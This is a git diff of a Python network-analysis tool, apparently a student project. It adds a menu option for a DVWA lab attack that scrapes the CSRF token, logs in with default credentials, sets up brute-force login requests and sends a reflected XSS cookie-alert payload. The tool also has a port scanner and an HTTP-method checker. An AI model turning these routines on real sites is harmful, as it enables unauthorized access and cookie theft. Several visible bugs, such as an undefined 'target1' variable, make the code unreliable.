@@ -3,7 +3,6 @@ import socket
 import time
 import threading
 import urllib
-from termcolor import colored
 from queue import Queue
 import os
 import struct
@@ -165,7 +164,7 @@ class ScannerIp:
             with print_lock:
                 portsResults.append(port)
                 print("---------------------------------------------------")
-                print(colored("[+] Port %d is open" % (port), 'green'))
+                print(("[+] Port %d is open" % (port), 'green'))
                 print("This is " + portsDict.ports.get(str(port)) + " port")
             con.close()
         except:
@@ -178,6 +177,216 @@ class ScannerIp:
             q.task_done()
 
 
+class attack:
+
+    # Get the anti-CSRF token
+
+    def csrf_token(self):
+
+        try:
+
+            # Make the request to the URL
+
+            print("\n[i] URL: %s/login.php" % target1)
+
+            r = requests.get("{0}/login.php".format(target1), allow_redirects=False)
+
+
+
+        except:
+
+            # Feedback for the user (there was an error) & Stop execution of our request
+
+            print("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target1))
+
+            sys.exit(-1)
+
+        # Extract anti-CSRF token
+
+        soup = BeautifulSoup(r.text, features="lxml")
+
+        user_token = soup("input", {"name": "user_token"})[0]["value"]
+
+        print("[i] user_token: %s" % user_token)
+
+        # Extract session information
+
+        session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
+
+        session_id = session_id.group(1)
+
+        print("[i] session_id: %s" % session_id)
+
+        return session_id, user_token
+
+    # Login to DVWA core
+
+    def dvwa_login(self, session_id, user_token):
+
+        # POST data
+
+        data = {
+
+            "username": dvwa_user,
+
+            "password": dvwa_pass,
+
+            "user_token": user_token,
+
+            "Login": "Login"
+
+        }
+
+        # Cookie data
+
+        cookie = {
+
+            "PHPSESSID": session_id,
+
+            "security": sec_level
+
+        }
+
+        try:
+
+            # Make the request to the URL
+
+            print("[i] Data: %s" % data)
+
+            print("[i] Cookie: %s" % cookie)
+
+            r = requests.post("{0}/login.php".format(target1), data=data, cookies=cookie, allow_redirects=False)
+
+
+
+
+
+        except:
+
+            # Feedback for the user (there was an error) & Stop execution of our request
+
+            print("\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
+
+            sys.exit(-1)
+
+        # Wasn't it a redirect?
+
+        if r.status_code != 301 and r.status_code != 302:
+            # Feedback for the user (there was an error again) & Stop execution of our request
+
+            print("\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
+
+            sys.exit(-1)
+
+        # Did we log in successfully?
+
+        if r.headers["Location"] != 'index.php':
+            # Feedback for the user (there was an error) & Stop execution of our request
+
+            print(
+
+                "\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
+
+                    r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))
+
+            sys.exit(-1)
+
+        # If we got to here, everything should be okay!
+
+        print("\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass))
+
+        return True
+
+    # Make the request to-do the brute force
+
+    def url_request(username, password, session_id):
+
+        # GET data
+
+        data = {
+
+            "username": username,
+
+            "password": password,
+
+            "Login": "Login"
+
+        }
+
+        # Cookie data
+
+        cookie = {
+
+            "PHPSESSID": session_id,
+
+            "security": sec_level
+
+        }
+
+        try:
+
+            r = requests.get("{0}/vulnerabilities/brute/".format(target1), params=data, cookies=cookie,
+
+                             allow_redirects=False)
+
+        except:
+
+            # Feedback for the user (there was an error) & Stop execution of our request
+
+            print("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target1))
+
+            sys.exit(-1)
+
+        # Was it a ok response?
+
+        if r.status_code != 200:
+            # Feedback for the user (there was an error again) & Stop execution of our request
+
+            print(
+                "\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
+
+            sys.exit(-1)
+
+        # We have what we need
+
+        return r.text
+
+    def xss_r(self, session_id, user_token):
+
+        print('\n\nVulnerability: Reflected Cross Site Scripting (XSS):\n')
+
+        # Cookie data
+
+        cookie = {
+
+            "PHPSESSID": session_id,
+
+            "security": sec_level
+
+        }
+
+        # POST data
+
+        payload = {
+
+            "name": '<sCript>alert(document.cookie)</sCript>',
+
+        }
+
+        # start req
+
+        resp = requests.get("{0}/vulnerabilities/xss_r/".format(target1), cookies=cookie, allow_redirects=False,
+
+                            params=payload)
+
+        soup = BeautifulSoup(resp.content, 'lxml')
+
+        vuln_tag = soup.find("pre")
+
+        webbrowser.open_new_tab(resp.url)
+
+        print(resp.url + "\n", vuln_tag)  # working
+
 
 print('''\033[1;97m██████╗░███████╗░█████╗░██████╗░
 ██╔══██╗██╔════╝██╔══██╗██╔══██╗
@@ -185,10 +394,9 @@ print('''\033[1;97m██████╗░███████╗░███�
 ██╔══██╗██╔══╝░░██╔══██║██║░░██║
 ██║░░██║███████╗██║░░██║██████╔╝
 ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝\033[0m\n''')
-
-
-while True:
-    print("""Welcome to our DevNet project work! Our program is focused on network analysis and troubleshooting.
+try:
+    while True:
+        print("""Welcome to our DevNet project work! Our program is focused on network analysis and troubleshooting.
     Functions of this program:
     ===============================================================================================================
     [1] Network scanner
@@ -205,100 +413,137 @@ while True:
     [4] Get Info about host
     This program will give you brief information about the host.
     ===============================================================================================================
-    [5] Quit
+    [5] XSS attack program
+    Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise 
+    benign and trusted websites.
+    ===============================================================================================================
+    [6] Quit 
     ===============================================================================================================
     """)
-    choice = int(input('[*] Please, enter the number of the feature you want to use: '))
-    portsResults = []
-    if choice == 1:
-        socket.setdefaulttimeout(0.25)
-        print_lock = threading.Lock()
-        target = input('[*] Enter the host to be scanned: ')
-        portNumber = int(input('[*] Enter the number of ports you want to scan: '))
-        t_IP = socket.gethostbyname(target)
-        print("[Scanning Target...] " + str(t_IP))
+        choice = int(input('[*] Please, enter the number of the feature you want to use: '))
+        portsResults = []
+        if choice == 1:
+            socket.setdefaulttimeout(0.25)
+            print_lock = threading.Lock()
+            target = input('[*] Enter the host to be scanned: ')
+            portNumber = int(input('[*] Enter the number of ports you want to scan: '))
+            t_IP = socket.gethostbyname(target)
+            print("[Scanning Target...] " + str(t_IP))
 
-        ip = ScannerIp(t_IP)
+            ip = ScannerIp(t_IP)
 
-        q = Queue()
-        startTime = time.time()
+            q = Queue()
+            startTime = time.time()
 
-        for x in range(500):
-            t = threading.Thread(target=ip.threader)
-            t.daemon = True
-            t.start()
+            for x in range(500):
+                t = threading.Thread(target=ip.threader)
+                t.daemon = True
+                t.start()
 
-        for worker in range(1, portNumber):
-            q.put(worker)
-        q.join()
+            for worker in range(1, portNumber):
+                q.put(worker)
+            q.join()
 
-        vul_choice = input('[*] Would you like to see the list of vulnerabilities for these ports? [y/n]: ')
-        for port in portsResults:
-            if vul_choice == 'y':
-                webbrowser.open_new_tab('https://www.speedguide.net/port.php?port=' + str(port))
-            if vul_choice == 'n':
-                break
-            else:
-                print("Please, type correct answer [y/n]")
-        continue_choice = input('[*] Would you like to continue? [y/n]: ')
-        if continue_choice=='y':
-            continue
-        if continue_choice=='n':
-            exit()
+            vul_choice = input('[*] Would you like to see the list of vulnerabilities for these ports? [y/n]: ')
+            for port in portsResults:
+                if vul_choice == 'y':
+                    webbrowser.open_new_tab('https://www.speedguide.net/port.php?port=' + str(port))
+                if vul_choice == 'n':
+                    break
+                else:
+                    print("Please, type correct answer [y/n]")
+            continue_choice = input('[*] Would you like to continue? [y/n]: ')
+            if continue_choice == 'y':
+                continue
+            if continue_choice == 'n':
+                exit()
 
+        if choice == 2:
+            target = input('[*] Enter the host to be scanned: ')
+            target = 'http://' + target
+            method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
+            for method in method_list:
+                req = requests.request(method, target)
+                print(method, req.status_code, req.reason)
+            if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
+                print('Cross Site Tracing(XST) is possible')
+            continue_choice = input('[*] Would you like to continue? [y/n]: ')
+            if continue_choice == 'y':
+                continue
+            if continue_choice == 'n':
+                exit()
 
-    if choice == 2:
-        target = input('[*] Enter the host to be scanned: ')
-        target='http://'+target
-        method_list = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
-        for method in method_list:
-            req = requests.request(method, target)
-            print(method, req.status_code, req.reason)
-        if method == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
-            print('Cross Site Tracing(XST) is possible')
-        continue_choice = input('[*] Would you like to continue? [y/n]: ')
-        if continue_choice=='y':
-            continue
-        if continue_choice=='n':
-            exit()
+        if choice == 3:
+            packet = packetAnalyzer()
+            packet.startPacketAnalyzer()
+            continue_choice = input('[*] Would you like to continue? [y/n]: ')
+            if continue_choice == 'y':
+                continue
+            if continue_choice == 'n':
+                exit()
 
-    if choice == 3:
-        packet = packetAnalyzer()
-        packet.startPacketAnalyzer()
-        continue_choice = input('[*] Would you like to continue? [y/n]: ')
-        if continue_choice == 'y':
-            continue
-        if continue_choice == 'n':
-            exit()
+        if choice == 4:
+            getIP = input('[*] Enter the host to get info: ')
+            t_IP = socket.gethostbyname(getIP)
+            url = "https://ipinfo.io/" + t_IP + "/json"
 
-    if choice == 4:
-        getIP = input('[*] Enter the host to get info: ')
-        t_IP = socket.gethostbyname(getIP)
-        url = "https://ipinfo.io/" + t_IP + "/json"
+            try:
+                getInfo = urllib.request.urlopen(url)
 
-        try:
-            getInfo = urllib.request.urlopen(url)
+            except:
+                print("\n[!] - IP not found! - [!]\n")
 
-        except:
-            print("\n[!] - IP not found! - [!]\n")
+            infoList = json.load(getInfo)
 
-        infoList = json.load(getInfo)
+            print("-" * 60)
 
-        print("-" * 60)
+            print("IP: ", infoList["ip"])
+            print("City: ", infoList["city"])
+            print("Region: ", infoList["region"])
+            print("Country: ", infoList["country"])
+            print("Hostname: ", infoList["hostname"])
+            print("timezone: ", infoList["timezone"])
+            print("org: ", infoList["org"])
+            print("-" * 60)
+            continue_choice = input('[*] Would you like to continue? [y/n]: ')
+            if continue_choice == 'y':
+                continue
+            if continue_choice == 'n':
+                exit()
 
-        print("IP: ", infoList["ip"])
-        print("City: ", infoList["city"])
-        print("Region: ", infoList["region"])
-        print("Country: ", infoList["country"])
-        print("Hostname: ", infoList["hostname"])
-        print("timezone: ", infoList["timezone"])
-        print("org: ", infoList["org"])
-        print("-" * 60)
-        continue_choice = input('[*] Would you like to continue? [y/n]: ')
-        if continue_choice=='y':
-            continue
-        if continue_choice=='n':
-            exit()
+        if choice == 5:
 
-    if choice == 5:
-        break
+            attack = attack()
+            target = input('Please enter target you want to check on XSS attack: ')
+
+            sec_level = 'low'
+
+            dvwa_user = 'Admin'
+
+            dvwa_pass = 'password'
+
+            user_list = 'brute_force/user_list.txt'
+
+            pass_list = 'brute_force/pass_list.txt'
+            # Get initial CSRF token
+
+            session_id, user_token = attack.csrf_token()
+
+            # Functions
+
+            attack.dvwa_login(session_id, user_token)
+
+            # Vulnerability: Low mode
+
+            attack.xss_r(session_id, user_token)
+
+            continue_choice = input('[*] Would you like to continue? [y/n]: ')
+            if continue_choice == 'y':
+                continue
+            if continue_choice == 'n':
+                exit()
+
+        if choice == 6:
+            break
+except:
+    print("An exception occurred")
